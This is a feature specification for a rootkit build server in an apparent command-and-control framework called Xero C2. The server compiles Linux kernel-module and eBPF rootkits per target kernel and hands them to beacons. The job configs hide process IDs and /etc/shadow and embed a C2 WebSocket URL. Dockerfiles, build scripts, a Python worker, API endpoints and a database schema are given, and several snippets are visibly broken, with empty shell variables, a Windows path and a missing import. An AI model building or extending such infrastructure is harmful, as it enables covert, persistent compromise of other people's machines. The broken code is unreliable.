# F0207: Rootkit Build Server

## Metadata
| Field | Value |
|---|---|
| ID | F0207 |
| Priority | v2 |
| Status | Planned |
| MVP Phase | v2 |
| Depends on | F0015, F0015.01-AMD, F0200, F0201, F0202 |

## Summary
Dynamic build server for compiling rootkit payloads on-demand based on target specifications. Downloads appropriate kernel headers and dependencies for the target system, compiles rootkit in isolated Docker containers, and delivers compiled artifacts to Xero C2 for beacon deployment. Mitigates kernel version incompatibility issues for Linux rootkits.

## Requirements
- Docker-based isolated build environment
- Support for multiple Linux distributions and kernel versions
- Kernel header download and caching
- LKM and eBPF compilation support
- Artifact storage and delivery through the F0015.01-AMD S3-compatible artifact store
- Build job queue and tracking
- Build logs and error reporting

## Architecture

`
+------------------+     +------------------+     +------------------+
|  Xero C2 API     |     |  Build Queue     |     |  Build Worker    |
|  (Trigger Build) |---->|  (Redis)         |---->|  (Docker)        |
+------------------+     +------------------+     +--------+---------+
                                                          |
                                                          v
                                                 +--------+---------+
                                                 |  Build Container |
                                                 |                  |
                                                 |  1. Download     |
                                                 |     headers      |
                                                 |  2. Configure    |
                                                 |  3. Compile      |
                                                 |  4. Package      |
                                                 +--------+---------+
                                                          |
                                                          v
                                                 +--------+---------+
                                                 |  Artifact Store  |
                                                 |  (F0015.01 S3)   |
                                                 +--------+---------+
                                                          |
                                                          v
+------------------+     +------------------+     +--------+---------+
|  Beacon          |<----|  Xero C2 API     |<----|  Build Complete  |
|  (Receive Payload)|    |  (Deliver)       |     |  Notification    |
+------------------+     +------------------+     +------------------+
`

## Build Job Structure

### Job Request
`json
{
  "job_id": "uuid",
  "rootkit_type": "lkm",
  "target": {
    "os": "linux",
    "kernel_version": "5.15.0-91-generic",
    "architecture": "x86_64",
    "distribution": "ubuntu",
    "distribution_version": "22.04"
  },
  "config": {
    "hidden_pids": [1234, 5678],
    "hidden_files": ["/etc/shadow"],
    "c2_url": "wss://c2.example.com",
    "heartbeat_interval": 60
  },
  "options": {
    "sign_module": false,
    "optimize": true,
    "debug_symbols": false
  },
  "created_at": "2024-01-01T00:00:00Z"
}
`

### Job Status
`json
{
  "job_id": "uuid",
  "status": "completed",
  "progress": 100,
  "logs": "Build successful...",
  "artifact_id": "uuid",
  "artifact_key": "c2/rootkit-builds/job_id/rootkit.ko",
  "completed_at": "2024-01-01T00:01:30Z"
}
`

## Docker Build Containers

### Ubuntu/Debian Base
`dockerfile
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y \
    build-essential \
    linux-headers-generic \
    kmod \
    wget \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /build
COPY rootkit-lkm /build/
`

### RHEL/CentOS Base
`dockerfile
FROM centos:stream9

RUN dnf install -y \
    gcc \
    make \
    kernel-headers \
    kernel-devel \
    wget \
    && dnf clean all

WORKDIR /build
COPY rootkit-lkm /build/
`

### eBPF Build
`dockerfile
FROM debian:bullseye

RUN apt-get update && apt-get install -y \
    build-essential \
    libelf-dev \
    libbpf-dev \
    clang \
    llvm \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /build
COPY rootkit-ebpf /build/
`

## Kernel Header Management

### Header Download
`ash
# Detect kernel version
KERNEL_VERSION=

# Ubuntu/Debian
apt-get install -y linux-headers-

# RHEL/CentOS
dnf install -y kernel-devel-

# Arch
pacman -S linux-headers
`

### Header Caching
`
/build-cache/
+-- ubuntu/
�   +-- 5.15.0-91-generic/
�   �   +-- include/
�   �   +-- Module.symvers
�   +-- 5.4.0-42-generic/
+-- centos/
�   +-- 4.18.0-348.el8.x86_64/
+-- arch/
    +-- 6.1.12-arch1-1/
`

## Build Process

### Stage 1: Environment Setup
`ash
#!/bin/bash
# setup.sh

TARGET_KERNEL=
TARGET_DISTRO=

# Install kernel headers
case  in
  ubuntu|debian)
    apt-get update
    apt-get install -y linux-headers-
    ;;
  centos|rhel)
    dnf install -y kernel-devel-
    ;;
esac

# Verify headers
if [ ! -d "/usr/src/linux-headers-" ]; then
  echo "ERROR: Headers not found"
  exit 1
fi
`

### Stage 2: Configuration
`ash
# Configure rootkit with target-specific settings
make CONFIG_C2_URL="wss://c2.example.com" \
     CONFIG_HEARTBEAT_INTERVAL=60 \
     CONFIG_HIDDEN_PIDS="1234,5678"
`

### Stage 3: Compilation
`ash
# Build kernel module
make -C /lib/modules//build M=C:\Users\Joe\dev\xero modules

# Output: rootkit.ko
`

### Stage 4: Packaging
`ash
# Create artifact package
tar -czvf rootkit-package.tar.gz \
    rootkit.ko \
    rootkit.conf \
    install.sh \
    uninstall.sh
`

## Build Worker Implementation

`python
# build_worker.py
import redis
import subprocess
import docker

class BuildWorker:
    def __init__(self):
        self.redis = redis.Redis(host='redis')
        self.docker = docker.from_env()

    def run(self):
        while True:
            # Get job from queue
            job = self.redis.lpop('build_queue')
            if not job:
                continue

            # Parse job
            job_data = json.loads(job)

            # Select container
            container_image = self.select_image(job_data)

            # Build in container
            try:
                artifact = self.build_in_container(job_data, container_image)
                self.mark_complete(job_data['job_id'], artifact)
            except Exception as e:
                self.mark_failed(job_data['job_id'], str(e))

    def build_in_container(self, job_data, image):
        # Create container
        container = self.docker.containers.run(
            image,
            command=f'/build/build.sh {json.dumps(job_data)}',
            volumes={'/artifacts': {'bind': '/output', 'mode': 'rw'}},
            remove=True
        )

        # Return packaged bytes to C2 for managed artifact storage.
        return self.read_output(f'/output/{job_data["job_id"]}.tar.gz')
`

## API Endpoints

### Trigger Build
`
POST /api/v1/rootkit/build
Content-Type: application/json

{
  "rootkit_type": "lkm",
  "target": {...},
  "config": {...}
}

Response:
{
  "job_id": "uuid",
  "status": "queued"
}
`

### Get Build Status
`
GET /api/v1/rootkit/build/{job_id}

Response:
{
  "job_id": "uuid",
  "status": "completed",
  "progress": 100,
  "artifact_id": "uuid",
  "artifact_available": true
}
`

### Download Artifact
`
GET /api/v1/rootkit/build/{job_id}/download

Response: [binary file]
`

## PostgreSQL Schema

`sql
CREATE TABLE rootkit_build_jobs (
    job_id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    rootkit_type VARCHAR(50) NOT NULL,
    target_os VARCHAR(50) NOT NULL,
    target_kernel_version VARCHAR(100),
    target_architecture VARCHAR(50) NOT NULL,
    config JSONB NOT NULL,
    status VARCHAR(50) DEFAULT 'queued',
    progress INTEGER DEFAULT 0,
    logs TEXT,
    artifact_id UUID REFERENCES artifacts(id) ON DELETE SET NULL,
    error_message TEXT,
    created_at TIMESTAMP DEFAULT NOW(),
    started_at TIMESTAMP,
    completed_at TIMESTAMP
);

CREATE INDEX idx_build_jobs_status ON rootkit_build_jobs(status);
CREATE INDEX idx_build_jobs_target ON rootkit_build_jobs(target_os, target_kernel_version);
CREATE INDEX idx_build_jobs_artifact ON rootkit_build_jobs(artifact_id);
`

## Stages

### Stage 1: Build Server Foundation
**Goal:** Implement build queue and worker.
**Acceptance Criteria:**
- [ ] Redis queue for build jobs
- [ ] Worker process picks up jobs
- [ ] Docker container execution
- [ ] Job status tracking in PostgreSQL

### Stage 2: Kernel Header Management
**Goal:** Download and cache kernel headers.
**Acceptance Criteria:**
- [ ] Detect target distribution
- [ ] Download correct kernel headers
- [ ] Cache headers for reuse
- [ ] Handle missing headers gracefully

### Stage 3: LKM Build Support
**Goal:** Compile Linux LKM rootkits.
**Acceptance Criteria:**
- [ ] Build LKM for target kernel
- [ ] Package with install scripts
- [ ] Optional module signing
- [ ] Verify module loads

### Stage 4: eBPF Build Support
**Goal:** Compile Linux eBPF rootkits.
**Acceptance Criteria:**
- [ ] Build eBPF programs with clang
- [ ] Generate CO-RE skeletons
- [ ] Package with loader binary
- [ ] Verify programs load

### Stage 5: API Integration
**Goal:** Integrate with Xero C2 API.
**Acceptance Criteria:**
- [ ] Trigger build from API
- [ ] Poll build status
- [ ] Download completed artifact
- [ ] UI shows build progress

## Feature Acceptance Criteria

- [ ] Build server compiles LKM for target kernel
- [ ] Build server compiles eBPF programs
- [ ] Kernel headers cached for faster builds
- [ ] Build artifacts downloadable from C2
- [ ] Build logs available for debugging

## Test Plan

### Unit Tests
- [ ] test_build_job_queue
- [ ] test_kernel_header_detection
- [ ] test_docker_container_build
- [ ] test_artifact_packaging

### System / Integration Tests
- [ ] Trigger build for Ubuntu 22.04; verify .ko produced
- [ ] Trigger build for CentOS 8; verify .ko produced
- [ ] Trigger eBPF build; verify .elf produced
- [ ] Build with cached headers; verify faster build
- [ ] Download artifact; verify beacon can use

### Playwright Tests
- [ ] Rootkit builder triggers build job
- [ ] Build progress shown in UI
- [ ] Completed artifact downloadable
- [ ] Build logs viewable

## Related Features

- **Overview:** [F0200](0200-rootkit-suite-overview.md)
- **Linux LKM:** [F0201](0201-linux-lkm-rootkit.md)
- **Linux eBPF:** [F0202](0202-linux-ebpf-rootkit.md)
- **Communication:** [F0205](0205-rootkit-communication.md)
